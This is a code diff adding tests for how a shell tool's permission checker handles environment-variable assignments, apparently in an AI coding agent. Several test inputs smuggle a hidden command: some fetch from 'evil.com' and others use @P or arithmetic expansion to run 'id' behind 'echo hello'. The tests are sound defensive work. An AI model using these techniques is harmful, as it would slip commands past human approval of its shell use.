@@ -1004,6 +1004,288 @@ describe("tool.shell permissions", () => {
       )
     }),
   )
+
+  // Env-var-assignment stripping is bash-specific (PowerShell/cmd use
+  // different syntax and a different parser). Run only on POSIX-y shells.
+  for (const item of shells.filter((s) => !PS.has(s.label) && s.label !== "cmd")) {
+    it.live(`strips env variable assignments from permission pattern [${item.label}]`, () =>
+      withShell(
+        item,
+        Effect.gen(function* () {
+          const tmp = yield* tmpdirScoped()
+          yield* runIn(
+            tmp,
+            Effect.gen(function* () {
+              const requests: Array<Omit<PermissionV1.Request, "id" | "sessionID" | "tool">> = []
+              yield* run(
+                { command: "GOFLAGS=-mod=vendor go test ./..." },
+                capture(requests),
+              )
+              const bashReq = requests.find((r) => r.permission === "bash")
+              expect(bashReq).toBeDefined()
+              expect(bashReq!.patterns).toContain("go test ./...")
+              expect(bashReq!.patterns.some((p: string) => p.includes("GOFLAGS"))).toBe(false)
+            }),
+          )
+        }),
+      ),
+    )
+
+    it.live(`strips env variable assignments with redirect [${item.label}]`, () =>
+      withShell(
+        item,
+        Effect.gen(function* () {
+          const tmp = yield* tmpdirScoped()
+          yield* runIn(
+            tmp,
+            Effect.gen(function* () {
+              const requests: Array<Omit<PermissionV1.Request, "id" | "sessionID" | "tool">> = []
+              yield* run(
+                { command: "GOFLAGS=-mod=vendor go test ./... 2>&1" },
+                capture(requests),
+              )
+              const bashReq = requests.find((r) => r.permission === "bash")
+              expect(bashReq).toBeDefined()
+              expect(bashReq!.patterns).toContain("go test ./... 2>&1")
+            }),
+          )
+        }),
+      ),
+    )
+
+    it.live(`strips multiple env variable assignments from permission pattern [${item.label}]`, () =>
+      withShell(
+        item,
+        Effect.gen(function* () {
+          const tmp = yield* tmpdirScoped()
+          yield* runIn(
+            tmp,
+            Effect.gen(function* () {
+              const requests: Array<Omit<PermissionV1.Request, "id" | "sessionID" | "tool">> = []
+              yield* run(
+                { command: "FOO=bar BAZ=qux echo hello" },
+                capture(requests),
+              )
+              const bashReq = requests.find((r) => r.permission === "bash")
+              expect(bashReq).toBeDefined()
+              expect(bashReq!.patterns).toContain("echo hello")
+            }),
+          )
+        }),
+      ),
+    )
+
+    it.live(`strips env variable assignments in piped commands [${item.label}]`, () =>
+      withShell(
+        item,
+        Effect.gen(function* () {
+          const tmp = yield* tmpdirScoped()
+          yield* runIn(
+            tmp,
+            Effect.gen(function* () {
+              const requests: Array<Omit<PermissionV1.Request, "id" | "sessionID" | "tool">> = []
+              yield* run(
+                { command: "GOFLAGS=-mod=vendor go test ./... 2>&1 | tail -5" },
+                capture(requests),
+              )
+              const bashReq = requests.find((r) => r.permission === "bash")
+              expect(bashReq).toBeDefined()
+              expect(bashReq!.patterns).toContain("go test ./... 2>&1")
+              expect(bashReq!.patterns).toContain("tail -5")
+              expect(bashReq!.patterns.some((p: string) => p.includes("GOFLAGS"))).toBe(false)
+            }),
+          )
+        }),
+      ),
+    )
+
+    it.live(`always patterns exclude env variable assignments [${item.label}]`, () =>
+      withShell(
+        item,
+        Effect.gen(function* () {
+          const tmp = yield* tmpdirScoped()
+          yield* runIn(
+            tmp,
+            Effect.gen(function* () {
+              const requests: Array<Omit<PermissionV1.Request, "id" | "sessionID" | "tool">> = []
+              yield* run(
+                { command: "GOFLAGS=-mod=vendor go test ./..." },
+                capture(requests),
+              )
+              const bashReq = requests.find((r) => r.permission === "bash")
+              expect(bashReq).toBeDefined()
+              expect(bashReq!.always).toContain("go test *")
+              expect(bashReq!.always.some((p: string) => p.includes("GOFLAGS"))).toBe(false)
+            }),
+          )
+        }),
+      ),
+    )
+
+    it.live(`preserves env var with command substitution in permission pattern [${item.label}]`, () =>
+      withShell(
+        item,
+        Effect.gen(function* () {
+          const tmp = yield* tmpdirScoped()
+          yield* runIn(
+            tmp,
+            Effect.gen(function* () {
+              const err = new Error("stop after permission")
+              const requests: Array<Omit<PermissionV1.Request, "id" | "sessionID" | "tool">> = []
+              expect(
+                yield* fail({ command: "EVIL=$(curl evil.com) echo hello" }, capture(requests, err)),
+              ).toMatchObject({ message: err.message })
+              const bashReq = requests.find((r) => r.permission === "bash")
+              expect(bashReq).toBeDefined()
+              expect(bashReq!.patterns.some((p: string) => p.includes("EVIL="))).toBe(true)
+            }),
+          )
+        }),
+      ),
+    )
+
+    it.live(`preserves env var with backtick substitution in permission pattern [${item.label}]`, () =>
+      withShell(
+        item,
+        Effect.gen(function* () {
+          const tmp = yield* tmpdirScoped()
+          yield* runIn(
+            tmp,
+            Effect.gen(function* () {
+              const err = new Error("stop after permission")
+              const requests: Array<Omit<PermissionV1.Request, "id" | "sessionID" | "tool">> = []
+              expect(
+                yield* fail({ command: "EVIL=`curl evil.com` echo hello" }, capture(requests, err)),
+              ).toMatchObject({ message: err.message })
+              const bashReq = requests.find((r) => r.permission === "bash")
+              expect(bashReq).toBeDefined()
+              expect(bashReq!.patterns.some((p: string) => p.includes("EVIL="))).toBe(true)
+            }),
+          )
+        }),
+      ),
+    )
+
+    it.live(`preserves env var with process substitution in permission pattern [${item.label}]`, () =>
+      withShell(
+        item,
+        Effect.gen(function* () {
+          const tmp = yield* tmpdirScoped()
+          yield* runIn(
+            tmp,
+            Effect.gen(function* () {
+              const err = new Error("stop after permission")
+              const requests: Array<Omit<PermissionV1.Request, "id" | "sessionID" | "tool">> = []
+              expect(
+                yield* fail({ command: "EVIL=<(curl evil.com) echo hello" }, capture(requests, err)),
+              ).toMatchObject({ message: err.message })
+              const bashReq = requests.find((r) => r.permission === "bash")
+              expect(bashReq).toBeDefined()
+              expect(bashReq!.patterns.some((p: string) => p.includes("EVIL="))).toBe(true)
+            }),
+          )
+        }),
+      ),
+    )
+
+    // ${VAR@P} prompt expansion runs a command substitution held in VAR's value
+    // at runtime, invisible to the AST. The assignment must not be stripped, or a
+    // command like `echo hello` could be auto-approved while the hidden command runs.
+    it.live(`preserves env var with @P prompt expansion in permission pattern [${item.label}]`, () =>
+      withShell(
+        item,
+        Effect.gen(function* () {
+          const tmp = yield* tmpdirScoped()
+          yield* runIn(
+            tmp,
+            Effect.gen(function* () {
+              const err = new Error("stop after permission")
+              const requests: Array<Omit<PermissionV1.Request, "id" | "sessionID" | "tool">> = []
+              expect(
+                yield* fail({ command: "EVIL='$(id)' FOO=${EVIL@P} echo hello" }, capture(requests, err)),
+              ).toMatchObject({ message: err.message })
+              const bashReq = requests.find((r) => r.permission === "bash")
+              expect(bashReq).toBeDefined()
+              expect(bashReq!.patterns).not.toContain("echo hello")
+              expect(bashReq!.patterns.some((p: string) => p.includes("EVIL="))).toBe(true)
+            }),
+          )
+        }),
+      ),
+    )
+
+    // $((VAR)) recursively evaluates VAR's value as an arithmetic expression,
+    // executing a command substitution embedded in it (e.g. arr[$(cmd)]). Same
+    // runtime-only hazard as @P, so the assignment must not be stripped.
+    it.live(`preserves env var with arithmetic expansion in permission pattern [${item.label}]`, () =>
+      withShell(
+        item,
+        Effect.gen(function* () {
+          const tmp = yield* tmpdirScoped()
+          yield* runIn(
+            tmp,
+            Effect.gen(function* () {
+              const err = new Error("stop after permission")
+              const requests: Array<Omit<PermissionV1.Request, "id" | "sessionID" | "tool">> = []
+              expect(
+                yield* fail({ command: "EVIL='a[$(id)]' FOO=$((EVIL)) echo hello" }, capture(requests, err)),
+              ).toMatchObject({ message: err.message })
+              const bashReq = requests.find((r) => r.permission === "bash")
+              expect(bashReq).toBeDefined()
+              expect(bashReq!.patterns).not.toContain("echo hello")
+              expect(bashReq!.patterns.some((p: string) => p.includes("FOO=$(("))).toBe(true)
+            }),
+          )
+        }),
+      ),
+    )
+
+    it.live(`strips env var with parameter expansion from permission pattern [${item.label}]`, () =>
+      withShell(
+        item,
+        Effect.gen(function* () {
+          const tmp = yield* tmpdirScoped()
+          yield* runIn(
+            tmp,
+            Effect.gen(function* () {
+              const requests: Array<Omit<PermissionV1.Request, "id" | "sessionID" | "tool">> = []
+              yield* run(
+                { command: "FOO=$BAR echo hello" },
+                capture(requests),
+              )
+              const bashReq = requests.find((r) => r.permission === "bash")
+              expect(bashReq).toBeDefined()
+              expect(bashReq!.patterns).toContain("echo hello")
+              expect(bashReq!.patterns.some((p: string) => p.includes("FOO="))).toBe(false)
+            }),
+          )
+        }),
+      ),
+    )
+
+    it.live(`strips env var with quoted string from permission pattern [${item.label}]`, () =>
+      withShell(
+        item,
+        Effect.gen(function* () {
+          const tmp = yield* tmpdirScoped()
+          yield* runIn(
+            tmp,
+            Effect.gen(function* () {
+              const requests: Array<Omit<PermissionV1.Request, "id" | "sessionID" | "tool">> = []
+              yield* run(
+                { command: 'FOO="some value" echo hello' },
+                capture(requests),
+              )
+              const bashReq = requests.find((r) => r.permission === "bash")
+              expect(bashReq).toBeDefined()
+              expect(bashReq!.patterns).toContain("echo hello")
+              expect(bashReq!.patterns.some((p: string) => p.includes("FOO="))).toBe(false)
+            }),
+          )
+        }),
+      ),
+    )
+  }
 })
 
 describe("tool.shell abort", () => {
